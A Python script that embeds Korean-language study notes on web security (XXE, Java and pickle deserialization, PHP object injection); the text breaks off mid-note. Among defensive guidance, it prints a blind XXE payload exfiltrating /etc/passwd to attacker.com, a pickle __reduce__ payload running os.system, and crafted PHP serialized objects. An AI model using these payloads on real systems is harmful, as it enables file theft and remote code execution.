import os
BASE = "/Users/pf/workspace/brainscience/content/studynote/09_security/05_web_app_security"

files = {
"459_xxe_attack_flow.md": (459, "459. XXE 공격 흐름 (XXE Attack Flow)", """
## 핵심 인사이트 (3줄 요약)
> 1. **본질**: XXE (XML External Entity) 공격 흐름은 DTD 외부 엔티티 선언 삽입 → XML 파서 트리거 → 로컬 파일·내부 서비스·OOB 채널 활용의 단계로 진행된다.
> 2. **가치**: 공격 흐름을 단계별로 이해하면 각 단계에서의 방어 포인트와 탐지 규칙을 정확하게 설계할 수 있다.
> 3. **판단 포인트**: Blind XXE에서는 파라미터 엔티티와 OOB 채널을 결합해 방화벽 내부 파일도 추출 가능하므로, 외부 엔티티 자체를 비활성화하는 것이 유일한 완전 방어책이다.

---

## Ⅰ. 개요 및 필요성

XXE (XML External Entity Injection) 공격은 XML 파서의 DTD (Document Type Definition) 처리 과정을 악용한다. 공격자가 XML 입력에 악성 외부 엔티티 선언을 포함시키면, 파서가 이를 처리하면서 공격자가 의도한 파일 읽기·내부 서비스 접근·서비스 거부(DoS) 등을 실행한다.

공격 흐름을 이해하는 것이 중요한 이유는 단순한 `file://` 프로토콜 필터링만으로는 막을 수 없는 고급 우회 기법들이 존재하기 때문이다. 파라미터 엔티티, Blind XXE OOB, SSRF 결합 등 다양한 변형을 파악해야 완전한 방어가 가능하다.

```text
┌──────────────────────────────────────────────────────────────┐
│                 XXE 공격 흐름 단계                            │
├──────────────────────────────────────────────────────────────┤
│  1단계: 취약한 XML 입력 엔드포인트 발견                       │
│  - Content-Type: application/xml 또는 text/xml               │
│  - 파일 업로드: .docx, .xlsx, .svg, .rss (내부 XML)          │
│  - SOAP 웹서비스, RSS 피드 파서 등                            │
│                                                              │
│  2단계: 악성 DTD 삽입                                        │
│  <!DOCTYPE root [                                            │
│    <!ENTITY xxe SYSTEM "file:///etc/passwd">                 │
│  ]>                                                          │
│                                                              │
│  3단계: 엔티티 참조로 파서 트리거                             │
│  <root><data>&xxe;</data></root>                             │
│                                                              │
│  4단계: 파서가 외부 엔티티 처리                               │
│  → /etc/passwd 파일 읽기 → &xxe; 자리에 내용 삽입            │
│                                                              │
│  5단계: 응답에 민감 정보 포함                                 │
│  <data>root:x:0:0:root:/root:/bin/bash...</data>             │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: XXE 공격 흐름은 마법 주문이 적힌 쪽지(악성 DTD)를 마법사(XML 파서)에게 주면, 마법사가 자동으로 주문을 읽고 비밀 문을 열어주는 것이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

### 고급 XXE 기법

| 기법 | 설명 | 사용 목적 |
|:---|:---|:---|
| 기본 외부 엔티티 | `SYSTEM "file://..."` | 로컬 파일 읽기 |
| SSRF XXE | `SYSTEM "http://..."` | 내부 서비스 접근 |
| 파라미터 엔티티 | `%xxe;` 형식 | DTD 내부에서 재정의 가능 |
| Blind XXE | OOB HTTP/DNS 콜백 | 응답 없는 환경에서 데이터 추출 |
| 에러 기반 XXE | 파일 내용을 오류 메시지에 포함 | 응답 본문 접근 불가 시 우회 |

```text
┌──────────────────────────────────────────────────────────────┐
│           Blind XXE OOB 데이터 추출 흐름                      │
├──────────────────────────────────────────────────────────────┤
│  공격자 외부 DTD (attacker.com/evil.dtd):                     │
│  <!ENTITY % file SYSTEM "file:///etc/passwd">                │
│  <!ENTITY % oob "<!ENTITY &#x25; leak SYSTEM              │
│    'http://attacker.com/?data=%file;'>">                     │
│  %oob; %leak;                                                │
│                                                              │
│  삽입 페이로드:                                               │
│  <!DOCTYPE root [<!ENTITY % ext SYSTEM                       │
│    "http://attacker.com/evil.dtd"> %ext;]>                   │
│                                                              │
│  실행 흐름:                                                   │
│  1. 서버: evil.dtd 로드 → %file에 /etc/passwd 내용 저장      │
│  2. 서버: attacker.com/?data=[passwd 내용] 요청               │
│  3. 공격자: HTTP 로그에서 passwd 내용 확인                    │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: Blind XXE OOB는 비밀 편지를 직접 읽지 못할 때, 심부름꾼(서버)에게 "이 편지 내용을 내 전화번호로 문자 보내줘"라고 우회적으로 지시하는 것이다.

---

## Ⅲ. 비교 및 연결

| 공격 유형 | 응답 가시성 | 탐지 난이도 | 데이터 추출 방식 |
|:---|:---|:---|:---|
| 기본 XXE | 응답에 직접 포함 | 낮음 | 응답 본문 읽기 |
| Blind XXE (OOB) | 응답에 미포함 | 높음 | DNS/HTTP 콜백 |
| 에러 기반 XXE | 오류 메시지에 포함 | 중간 | 오류 응답 파싱 |
| SSRF XXE | 내부 서비스 응답 | 중간 | 내부 API 응답 |

에러 기반 XXE는 XML 파서가 오류 발생 시 파일 내용 일부를 오류 메시지에 포함하는 경우를 활용한다. `file:///nonexistent/` + `%파일내용` 조합으로 오류 메시지에서 민감 정보를 추출한다.

📢 **섹션 요약 비유**: XXE 변형들은 같은 보물 지도를 다른 방법으로 읽는 것이다. 직접 읽기(기본), 반사경으로 읽기(OOB), 뒤집어 읽기(에러 기반) 등 방법이 다양하다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**취약 코드 vs. 안전 코드 비교**:

취약한 코드 (PHP):
```php
$dom = new DOMDocument();
$dom->loadXML($userInput);  // 외부 엔티티 처리 활성화됨
```

안전한 코드 (PHP):
```php
libxml_disable_entity_loader(true);  // PHP 7.x
$dom = new DOMDocument();
$dom->loadXML($userInput, LIBXML_NONET | LIBXML_NOENT);
```

**SVG 파일 업로드 XXE 시나리오**:
- SVG (Scalable Vector Graphics) 파일은 XML 기반
- 이미지 업로드 기능에서 SVG 허용 시 XXE 가능
- 방어: SVG 파일을 서버에서 파싱하지 않거나, 화이트리스트 기반 재인코딩

📢 **섹션 요약 비유**: XXE 방어 코드 수정은 마법 학교에서 "외부 주문서는 읽지 말 것"이라는 교칙을 추가하는 것이다. 규칙 한 줄이 모든 위험을 막는다.

---

## Ⅴ. 기대효과 및 결론

XXE 공격 흐름을 단계별로 이해하고 각 단계에서의 방어를 적용하면 기본 XXE부터 고급 Blind XXE OOB까지 모든 변형을 차단할 수 있다. XML 파서 설정 한 줄이 가장 효과적인 방어이며, 추가로 SVG·DOCX 등 XML 기반 파일 형식을 업로드받을 때는 반드시 파서 설정을 재확인해야 한다.

정기적인 DAST (Dynamic Application Security Testing) 도구와 XXE 페이로드 테스트를 CI/CD 파이프라인에 포함시켜 새로운 XML 처리 코드가 추가될 때 자동으로 XXE 취약점을 검출하는 것이 이상적이다.

📢 **섹션 요약 비유**: XXE 완전 방어는 마법사에게 "어떤 외부 주문서도 읽지 마라"는 봉인(외부 엔티티 비활성화)을 건 뒤, 새 마법사가 올 때마다 봉인을 확인(DAST 자동화)하는 것이다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| DTD (Document Type Definition) | 공격 경로 | 외부 엔티티 정의 위치 |
| 파라미터 엔티티 | 고급 기법 | DTD 내부 재정의 가능 |
| OOB (Out-of-Band) | 데이터 추출 | DNS/HTTP 콜백 활용 |
| DAST | 탐지 도구 | 동적 취약점 스캔 |
| LIBXML_NOENT | 방어 플래그 | PHP XML 외부 엔티티 비활성화 |

### 👶 어린이를 위한 3줄 비유 설명
- XXE 공격 흐름은 마법 주문이 적힌 쪽지를 마법사에게 주면서 "이 주문 읽어줘"라고 하는 거예요.
- 마법사가 읽으면 비밀 문이 열리거나 비밀 편지가 나쁜 사람에게 전달돼요.
- 마법사에게 "외부 주문서는 절대 읽지 마!"라고 교육하면(외부 엔티티 비활성화) 막을 수 있어요!
"""),

"460_insecure_deserialization.md": (460, "460. Deserialization 취약점 (Insecure Deserialization)", """
## 핵심 인사이트 (3줄 요약)
> 1. **본질**: 안전하지 않은 역직렬화 (Insecure Deserialization)는 신뢰할 수 없는 소스에서 직렬화된 데이터를 검증 없이 역직렬화할 때, 공격자가 객체 그래프를 조작해 임의 코드 실행(RCE)까지 가능한 심각한 취약점이다.
> 2. **가치**: 역직렬화 취약점은 인증 우회, 권한 상승, 원격 코드 실행, 서비스 거부까지 광범위한 공격이 가능하며, OWASP Top 10 2017 A08에서 독립 항목으로 다뤄질 만큼 중요하다.
> 3. **판단 포인트**: 사용자 입력을 역직렬화하는 것 자체를 피하는 것이 근본 해결책이며, 불가피한 경우 서명(HMAC) 검증과 역직렬화 필터(화이트리스트)가 필수다.

---

## Ⅰ. 개요 및 필요성

직렬화 (Serialization)는 객체를 바이트 스트림이나 텍스트(JSON, XML, 이진 포맷)로 변환해 저장·전송하는 과정이다. 역직렬화 (Deserialization)는 그 반대 과정으로 바이트 스트림을 다시 객체로 복원한다.

문제는 역직렬화 과정이 단순한 데이터 복원이 아니라, 객체의 생성자·매직 메서드·리플렉션 등을 실행할 수 있다는 점이다. 공격자가 역직렬화 과정에서 실행될 가젯 체인 (Gadget Chain)을 조작하면, 파일 삭제·네트워크 접속·명령 실행 등 임의 코드가 실행된다.

```text
┌──────────────────────────────────────────────────────────────┐
│          안전하지 않은 역직렬화 개념도                        │
├──────────────────────────────────────────────────────────────┤
│  직렬화 (정상 흐름):                                          │
│  [객체] ─직렬화─▶ [바이트 스트림] ─저장/전송─▶ [역직렬화]    │
│                                                              │
│  공격 흐름:                                                   │
│  [악성 객체 그래프] ─직렬화─▶ [조작된 바이트 스트림]          │
│                                ─쿠키/파라미터로 전송─▶        │
│                                     [역직렬화 시 RCE 실행]    │
│                                                              │
│  Java 예: readObject() 실행 중 Runtime.exec() 호출           │
│  Python 예: pickle.loads() 실행 중 os.system() 호출          │
└──────────────────────────────────────────────────────────────┘
```

역직렬화 취약점이 특히 위험한 이유는 공격 코드가 데이터처럼 보이기 때문이다. 방화벽이나 WAF (Web Application Firewall)가 "데이터"를 차단하기 어렵고, 서버 내부에서 실행되므로 탐지도 쉽지 않다.

📢 **섹션 요약 비유**: 역직렬화 취약점은 수상한 소포(직렬화된 데이터)를 개봉할 때(역직렬화) 안에 숨어있던 폭탄(악성 코드)이 터지는 것이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

### 가젯 체인 (Gadget Chain) 동작 원리

| 단계 | 설명 | Java 예시 |
|:---|:---|:---|
| 1. 진입점 | 역직렬화 진입 클래스 | ObjectInputStream.readObject() |
| 2. 가젯 체인 시작 | 첫 번째 가젯 클래스 메서드 호출 | readObject() 오버라이드 |
| 3. 연쇄 호출 | 가젯들이 서로 메서드 호출 | InvokerTransformer |
| 4. 최종 실행 | 임의 명령 실행 | Runtime.exec("cmd") |

```text
┌──────────────────────────────────────────────────────────────┐
│          Java 가젯 체인 구조 (Apache Commons Collections)     │
├──────────────────────────────────────────────────────────────┤
│  ObjectInputStream.readObject()                              │
│         │                                                    │
│         ▼                                                    │
│  HashSet.readObject() ─▶ HashMap.put()                       │
│         │                                                    │
│         ▼                                                    │
│  TiedMapEntry.hashCode() ─▶ LazyMap.get()                    │
│         │                                                    │
│         ▼                                                    │
│  ChainedTransformer.transform()                              │
│         │                                                    │
│         ▼                                                    │
│  InvokerTransformer.transform() ─▶ Runtime.exec("calc.exe") │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: 가젯 체인은 도미노처럼 하나가 쓰러지면 연쇄 반응으로 마지막 폭발물(RCE)이 터지도록 설계된 트랩이다.

---

## Ⅲ. 비교 및 연결

| 언어/플랫폼 | 취약 함수 | 위험 수준 | 주요 도구 |
|:---|:---|:---|:---|
| Java | ObjectInputStream.readObject() | 매우 높음 | ysoserial |
| Python | pickle.loads() | 매우 높음 | - |
| PHP | unserialize() | 높음 | phpggc |
| Ruby | Marshal.load() | 높음 | - |
| .NET | BinaryFormatter | 높음 | ysoserial.net |

ysoserial은 Java 역직렬화 가젯 체인을 자동으로 생성하는 도구로, 보안 연구자와 공격자 모두 사용한다. 알려진 가젯 체인 라이브러리(Apache Commons Collections, Spring Framework 등)가 클래스패스에 있으면 취약하다.

📢 **섹션 요약 비유**: 언어마다 다른 역직렬화 취약점은 같은 설계 결함이 각기 다른 재질(언어)로 만들어진 것이다. 금속이든 나무든 같은 설계 오류가 있으면 똑같이 위험하다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**방어 전략**:
1. **근본 해결**: 사용자 입력을 역직렬화하지 않음. JSON/XML 등 단순 포맷 사용
2. **무결성 검증**: HMAC (Hash-based Message Authentication Code) 서명으로 데이터 변조 탐지
3. **역직렬화 필터**: Java 9+ ObjectInputFilter로 허용 클래스 화이트리스트 적용
4. **격리 실행**: 역직렬화를 별도 프로세스에서 샌드박스로 실행
5. **모니터링**: 역직렬화 호출 로깅 + 이상 클래스 로딩 탐지 (Java 에이전트)

Java ObjectInputFilter 예:
```java
ObjectInputFilter filter = info -> {
    if (info.serialClass() != null &&
        !ALLOWED_CLASSES.contains(info.serialClass().getName()))
        return ObjectInputFilter.Status.REJECTED;
    return ObjectInputFilter.Status.ALLOWED;
};
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
```

📢 **섹션 요약 비유**: 역직렬화 방어는 소포를 받기 전에 발신인 목록(화이트리스트)을 확인하고, 목록에 없는 발신인의 소포는 개봉 전에 파기하는 것이다.

---

## Ⅴ. 기대효과 및 결론

안전하지 않은 역직렬화를 방어하면 RCE를 포함한 심각한 취약점 계층 전체를 제거할 수 있다. 특히 자바 기반 엔터프라이즈 시스템에서 레거시 직렬화 사용은 정기적으로 점검해야 하며, 가능하면 현대적 직렬화 포맷(JSON with schema validation, Protocol Buffers)으로 전환하는 것이 장기적 해결책이다.

📢 **섹션 요약 비유**: 역직렬화 완전 방어는 소포 수령 방식 자체를 바꾸는 것이다 — 박스째 받는 것이 아니라, 내용물만 확인된 것으로만 받는 안전 배송 시스템으로 전환하는 것.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| 가젯 체인 (Gadget Chain) | 공격 구조 | 역직렬화 중 연쇄 실행 |
| ysoserial | 공격 도구 | Java 가젯 체인 생성기 |
| ObjectInputFilter | 방어 도구 | Java 역직렬화 화이트리스트 |
| HMAC | 무결성 보장 | 데이터 변조 탐지 |
| RCE (Remote Code Execution) | 최악의 결과 | 임의 코드 실행 |

### 👶 어린이를 위한 3줄 비유 설명
- 역직렬화 취약점은 마법 상자(직렬화 데이터)를 열면(역직렬화) 안에서 몬스터(악성 코드)가 튀어나오는 거예요.
- 상자를 열 때 "안에 뭐가 있는지" 확인 안 하면 아무 것도 모르고 당해요.
- 허락된 물건만 들어있는 상자만 열기로 하면(화이트리스트) 몬스터가 못 나와요!
"""),

"461_java_deserialization.md": (461, "461. Java Deserialization 취약점", """
## 핵심 인사이트 (3줄 요약)
> 1. **본질**: Java Deserialization 취약점은 `ObjectInputStream.readObject()`가 사용자 제어 데이터를 처리할 때, 클래스패스에 존재하는 가젯 체인을 통해 원격 코드 실행(RCE)이 가능한 취약점이다.
> 2. **가치**: Apache Commons Collections, Spring Framework, Groovy 같은 광범위하게 사용되는 라이브러리들이 가젯 체인을 포함하여, 대부분의 Java EE 서버가 잠재적으로 취약하다.
> 3. **판단 포인트**: Java 9+의 ObjectInputFilter로 역직렬화 허용 클래스를 화이트리스트로 제한하는 것이 가장 효과적인 방어이며, 레거시 시스템은 SerialKiller 라이브러리로 임시 방어 가능하다.

---

## Ⅰ. 개요 및 필요성

Java 역직렬화 취약점은 2015년 FoxGlove Security의 보고서 "What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common?"으로 대중에 알려졌다. 당시 Apache Commons Collections 라이브러리의 가젯 체인을 이용한 RCE가 Java EE 서버 전반에 영향을 미쳤다.

Java의 직렬화 형식은 매직 바이트 `0xACED 0x0005`로 시작한다. 이 바이트 시퀀스는 쿠키, POST 바디, HTTP 헤더 등 어디서든 나타날 수 있으며, Base64로 인코딩된 경우 `rO0AB`로 시작하는 패턴이 역직렬화 엔드포인트의 특징이다.

```text
┌──────────────────────────────────────────────────────────────┐
│             Java 직렬화 데이터 식별                           │
├──────────────────────────────────────────────────────────────┤
│  Raw 바이트:  AC ED 00 05  (매직 바이트)                      │
│  Base64:      rO0AB...     (쿠키·파라미터에서 자주 발견)       │
│                                                              │
│  취약한 엔드포인트 예:                                        │
│  - Java RMI (Remote Method Invocation) 포트 1099             │
│  - JMX (Java Management Extensions) 포트 1099, 9999          │
│  - WebLogic T3 프로토콜 포트 7001                             │
│  - Apache JServ Protocol (AJP) 포트 8009                     │
│  - AMF (Action Message Format) for Flash                     │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: Java 직렬화 매직 바이트는 "이 소포 안에 폭발물이 있을 수 있다"는 경고 스티커다. 이 스티커가 붙은 소포는 특별 처리가 필요하다.

---

## Ⅱ. 아키텍처 및 핵심 원리

### 주요 가젯 체인 라이브러리

| 라이브러리 | CVE 예시 | 영향 범위 |
|:---|:---|:---|
| Apache Commons Collections | CVE-2015-4852 | 광범위 (대부분 Java EE) |
| Spring Framework | CVE-2011-2894 | Spring 애플리케이션 |
| Apache Groovy | CVE-2015-3253 | Groovy 사용 앱 |
| JBoss/EAP | CVE-2015-7501 | JBoss 서버 |
| Oracle WebLogic | CVE-2019-2725 | WebLogic 서버 |

```text
┌──────────────────────────────────────────────────────────────┐
│          Apache Commons Collections 가젯 체인 흐름           │
├──────────────────────────────────────────────────────────────┤
│  readObject()                                                │
│      │                                                       │
│      ▼ HashSet.readObject()                                  │
│      │                                                       │
│      ▼ TiedMapEntry.hashCode()                               │
│      │                                                       │
│      ▼ LazyMap.get(key)                                      │
│      │                                                       │
│      ▼ ChainedTransformer.transform()                        │
│      │                                                       │
│      ▼ InvokerTransformer("exec", ...)                       │
│      │                                                       │
│      ▼ Runtime.getRuntime().exec("whoami")   ← RCE!          │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: 가젯 체인은 마치 자동 도미노처럼, 첫 번째 가젯이 쓰러지면 연쇄적으로 마지막 '폭발'(RCE)까지 자동 진행된다.

---

## Ⅲ. 비교 및 연결

| 방어 방법 | 적용 범위 | 효과 | 비고 |
|:---|:---|:---|:---|
| ObjectInputFilter (Java 9+) | JVM 수준 | 매우 높음 | 화이트리스트 적용 |
| SerialKiller 라이브러리 | 애플리케이션 | 높음 | 레거시 Java 8 지원 |
| NotSoSerial Java 에이전트 | JVM 에이전트 | 높음 | 런타임 패치 |
| 취약 라이브러리 업그레이드 | 클래스패스 | 중간 | 새 가젯 발견 가능 |
| 네트워크 분리 | 네트워크 | 중간 | 노출 범위 축소 |

JNDI (Java Naming and Directory Interface) 인젝션 (Log4Shell, CVE-2021-44228)도 역직렬화와 유사하게 JNDI 조회를 통해 원격 코드를 실행한다. 이는 Java 역직렬화 취약점의 변형이자 관련된 공격 패턴이다.

📢 **섹션 요약 비유**: 방어 방법들은 폭탄 처리 방식의 차이다. 폭탄 자체를 제거(취약 라이브러리 제거)가 최고지만, 폭발해도 피해를 막는 방어벽(필터)도 중요하다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**취약 여부 진단 체크리스트**:
1. `ObjectInputStream`을 직접 사용하는 코드 위치 목록 작성
2. 클래스패스에 취약한 가젯 라이브러리 버전 확인 (`mvn dependency:tree`)
3. Java RMI, JMX, AJP 포트 외부 노출 여부 점검
4. 애플리케이션 쿠키에서 `rO0AB` 패턴 확인
5. ysoserial 도구로 모의 공격 페이로드 테스트 (승인된 범위에서)

**마이그레이션 전략**:
- Java 직렬화 → Jackson JSON + 스키마 검증
- 분산 캐시: Java 직렬화 → Kryo + 화이트리스트, 또는 JSON
- Java RMI → gRPC (Protocol Buffers)

📢 **섹션 요약 비유**: Java 역직렬화 마이그레이션은 노후화된 위험한 배관(Java 직렬화)을 현대적인 안전 배관(JSON/Protocol Buffers)으로 교체하는 리모델링이다.

---

## Ⅴ. 기대효과 및 결론

Java 역직렬화 취약점을 제거하면 RCE, 권한 상승, 서비스 거부 등 심각한 공격 벡터를 원천 차단할 수 있다. 특히 엔터프라이즈 Java 환경(WebLogic, JBoss, WebSphere)에서는 정기적인 패치와 ObjectInputFilter 적용이 필수적이다.

새로운 가젯 체인은 지속적으로 발견되므로, 단순한 취약 라이브러리 업그레이드만으로는 충분하지 않다. 근본적으로 사용자 입력 역직렬화 자체를 제거하는 아키텍처 전환이 장기 해결책이다.

📢 **섹션 요약 비유**: Java 역직렬화 방어의 완성은 택배 수령 방식을 "박스째 받아 개봉"에서 "내용물만 목록 확인 후 수령"으로 바꾸는 물류 시스템 혁신이다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| ysoserial | 공격/테스트 도구 | Java 가젯 체인 생성 |
| ObjectInputFilter | 핵심 방어 | Java 9+ 역직렬화 필터 |
| Log4Shell | 연관 취약점 | JNDI 인젝션 RCE |
| SerialKiller | 방어 라이브러리 | 역직렬화 블랙리스트 |
| Apache Commons Collections | 취약 라이브러리 | 가젯 체인 포함 |

### 👶 어린이를 위한 3줄 비유 설명
- Java 역직렬화 취약점은 마법 상자의 잠금이 풀릴 때 안에 숨어있던 마법이 자동으로 실행되는 거예요.
- 나쁜 마법사가 상자 안에 "열리면 문을 열어라"는 마법을 심어뒀거든요.
- 상자를 열기 전에 "이 상자에서 어떤 마법이 나올지" 확인하면(ObjectInputFilter) 막을 수 있어요!
"""),

"462_pickle_deserialization.md": (462, "462. pickle Deserialization (Python Pickle Insecure Deserialization)", """
## 핵심 인사이트 (3줄 요약)
> 1. **본질**: Python `pickle` 모듈의 역직렬화는 `__reduce__` 메서드를 통해 임의 Python 코드를 실행할 수 있어, 신뢰할 수 없는 데이터를 `pickle.loads()`로 처리하는 것은 즉각적인 RCE 위험이다.
> 2. **가치**: ML (Machine Learning) 모델 파일(.pkl, .pt)이 pickle 형식으로 저장되는 경우가 많아, AI/ML 파이프라인이 새로운 역직렬화 공격 표면으로 부상하고 있다.
> 3. **판단 포인트**: pickle을 외부 입력 처리에 절대 사용하지 않는 것이 유일한 완전 방어이며, ML 모델도 Safetensors, ONNX 같은 안전한 포맷으로 저장해야 한다.

---

## Ⅰ. 개요 및 필요성

Python의 `pickle` 모듈은 Python 객체를 직렬화·역직렬화하는 표준 라이브러리다. 그러나 Python 공식 문서에 명시적으로 "신뢰할 수 없는 데이터는 절대 역직렬화하지 마세요"라고 경고할 만큼 위험하다.

pickle이 위험한 이유는 역직렬화 시 `__reduce__` 메서드가 자동으로 호출되며, 이 메서드가 `os.system()`, `subprocess.Popen()` 등 임의 명령을 실행할 수 있기 때문이다. Java의 가젯 체인처럼 중간 단계 없이 직접 코드를 삽입할 수 있어 오히려 더 단순하고 강력하다.

```text
┌──────────────────────────────────────────────────────────────┐
│            Python pickle RCE 페이로드                        │
├──────────────────────────────────────────────────────────────┤
│  import pickle, os                                           │
│                                                              │
│  class Exploit(object):                                      │
│      def __reduce__(self):                                   │
│          return (os.system, ('id && whoami',))               │
│                                                              │
│  payload = pickle.dumps(Exploit())                           │
│  # payload를 서버에 전송                                     │
│                                                              │
│  서버측: pickle.loads(payload)                               │
│  → os.system('id && whoami') 실행 → RCE!                     │
└──────────────────────────────────────────────────────────────┘
```

최근 주목받는 위협은 ML 모델 공유 플랫폼(Hugging Face, MLflow)에서 악성 pickle 모델 파일이 업로드되어, 사용자가 모델을 로드하는 순간 RCE가 발생하는 공급망 공격이다.

📢 **섹션 요약 비유**: Python pickle은 마법사의 주문서처럼, 펼치는 순간(로드) 안에 적힌 모든 마법이 자동으로 실행된다. 모르는 주문서는 절대 펼치면 안 된다.

---

## Ⅱ. 아키텍처 및 핵심 원리

### pickle 프로토콜 취약점 메커니즘

| 단계 | 설명 | 위험 요소 |
|:---|:---|:---|
| 직렬화 | pickle.dumps(obj) | 공격자가 __reduce__ 조작 |
| 전송/저장 | 파일·네트워크·쿠키 | 검증 없이 신뢰 |
| 역직렬화 | pickle.loads(data) | __reduce__ 자동 실행 |
| 코드 실행 | os.system() 등 호출 | RCE 발생 |

```text
┌──────────────────────────────────────────────────────────────┐
│            ML 모델 파일 공급망 공격 흐름                      │
├──────────────────────────────────────────────────────────────┤
│  공격자                                                      │
│  1. 악성 __reduce__ 포함한 모델 객체 생성                     │
│  2. pickle.dumps()로 직렬화 → model.pkl 파일 생성            │
│  3. Hugging Face / MLflow에 모델 업로드                       │
│                                                              │
│  피해자                                                      │
│  4. model = torch.load('model.pkl')  ← pickle.load() 내부 호출│
│  5. 로드 즉시 악성 코드 실행 → 개발자 머신 RCE               │
│                                                              │
│  영향: 개발자 인증서, SSH 키, API 토큰 탈취                   │
└──────────────────────────────────────────────────────────────┘
```

`torch.load()`, `joblib.load()`, `numpy.load()` 등 많은 ML 관련 함수가 내부적으로 pickle을 사용한다.

📢 **섹션 요약 비유**: ML 모델 pickle 공격은 인터넷에서 받은 요리 레시피(모델)를 따라 하면 갑자기 집에 불이 나는 것이다. 레시피를 확인하지 않고 실행하면 위험하다.

---

## Ⅲ. 비교 및 연결

| 직렬화 포맷 | 언어 | RCE 위험 | 안전 대안 |
|:---|:---|:---|:---|
| pickle | Python | 매우 높음 | JSON, Safetensors |
| Java Serialization | Java | 매우 높음 | JSON + 스키마 |
| PHP serialize() | PHP | 높음 | JSON |
| Ruby Marshal | Ruby | 높음 | JSON, MessagePack |
| .NET BinaryFormatter | .NET | 높음 | System.Text.Json |

Safetensors는 Hugging Face가 개발한 ML 모델 저장 포맷으로, pickle을 사용하지 않고 순수 텐서 데이터만 저장해 역직렬화 RCE 위험이 없다.

📢 **섹션 요약 비유**: 안전한 직렬화 포맷 선택은 요리 재료를 안전한 냉동 진공포장(Safetensors)에 보관하는 것과 같다. 개봉해도 코드가 실행되지 않는 포장재를 쓰면 된다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**방어 전략**:
1. **근본 해결**: 외부 입력에 절대 pickle 사용 금지 → JSON으로 대체
2. **ML 모델**: Safetensors, ONNX (Open Neural Network Exchange), TensorFlow SavedModel 형식 사용
3. **코드 검토**: `pickle.loads()`, `torch.load()`, `joblib.load()` 사용 위치 모두 감사
4. **제한적 사용 시**: HMAC으로 데이터 서명 후 검증 + 신뢰된 소스만 로드
5. **보안 도구**: Fickling(Trail of Bits) - pickle 파일 정적 분석 도구

Fickling 사용 예:
```bash
fickling model.pkl  # pickle 파일의 악성 코드 탐지
```

📢 **섹션 요약 비유**: pickle 방어는 식당에서 모르는 사람이 가져온 음식(외부 pickle)은 절대 서빙하지 않고, 직접 만든 안전한 재료(JSON/Safetensors)만 사용하는 것이다.

---

## Ⅴ. 기대효과 및 결론

Python pickle 역직렬화 취약점을 제거하면 ML 파이프라인의 공급망 공격, 웹 애플리케이션 RCE, 캐시 기반 공격을 동시에 차단할 수 있다. 특히 AI/ML 시대에 모델 공유가 활발해지면서 pickle 기반 공격 표면이 빠르게 확대되고 있으므로, ML 팀도 보안 훈련이 필요하다.

📢 **섹션 요약 비유**: pickle 완전 방어는 마법 주문서 형식(pickle)을 폐기하고, 그림만 있는 레시피북(Safetensors)으로 전환하는 것이다. 그림은 보기만 하면 되고 실행되지 않는다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| __reduce__ | 공격 진입점 | pickle 역직렬화 시 자동 호출 |
| Safetensors | 안전 대안 | ML 모델 안전 저장 포맷 |
| ONNX | 안전 대안 | 플랫폼 중립 ML 모델 포맷 |
| Fickling | 탐지 도구 | pickle 정적 분석 |
| ML 공급망 공격 | 현대 위협 | 악성 모델 파일 배포 |

### 👶 어린이를 위한 3줄 비유 설명
- Python pickle은 특별한 마법 상자인데, 열면 안에 적힌 명령이 자동으로 실행돼요.
- 나쁜 사람이 만든 마법 상자를 열면 컴퓨터가 나쁜 사람의 명령을 따라 하게 돼요.
- 마법 상자 대신 그냥 메모지(JSON/Safetensors)를 쓰면 실행되는 것 없이 안전해요!
"""),

"463_php_object_injection.md": (463, "463. PHP Object Injection", """
## 핵심 인사이트 (3줄 요약)
> 1. **본질**: PHP Object Injection은 `unserialize()` 함수가 사용자 제어 문자열을 처리할 때 PHP 매직 메서드(`__wakeup`, `__destruct`, `__toString`)가 자동으로 실행되어 임의 코드 실행·파일 조작·SQL 인젝션 등이 가능한 취약점이다.
> 2. **가치**: WordPress, Laravel, Joomla 등 인기 PHP 프레임워크와 플러그인에서 반복적으로 발견되며, 가젯 클래스(POP Chain)를 결합하면 웹셸 업로드나 관리자 권한 탈취까지 가능하다.
> 3. **판단 포인트**: 사용자 입력에 `unserialize()`를 절대 적용하지 않는 것이 근본 해결책이며, PHP 7+의 `allowed_classes` 옵션으로 역직렬화 허용 클래스를 제한해야 한다.

---

## Ⅰ. 개요 및 필요성

PHP의 `unserialize()` 함수는 `serialize()`로 생성된 문자열을 다시 PHP 객체로 복원한다. 이 과정에서 PHP는 특정 매직 메서드를 자동으로 호출한다. `__wakeup()`은 역직렬화 직후, `__destruct()`는 객체가 소멸될 때, `__toString()`은 객체가 문자열로 변환될 때 자동 실행된다.

공격자는 이 매직 메서드들을 트리거하는 직렬화 문자열을 조작해, 코드 실행·파일 삭제·DNS 조회·SQL 쿼리 실행 등을 유발하는 POP (Property-Oriented Programming) 체인을 구성한다.

```text
┌──────────────────────────────────────────────────────────────┐
│           PHP Object Injection 기본 흐름                      │
├──────────────────────────────────────────────────────────────┤
│  PHP 직렬화 형식:                                             │
│  O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}│
│  └── O: 객체, 4: 클래스명 길이, User: 클래스명              │
│                                                              │
│  공격자가 조작한 페이로드:                                    │
│  O:4:"Evil":1:{s:4:"file";s:15:"/etc/passwd";}               │
│                                                              │
│  서버: $obj = unserialize($_COOKIE['data']);                  │
│  → Evil 객체 생성 → __destruct() 자동 호출                   │
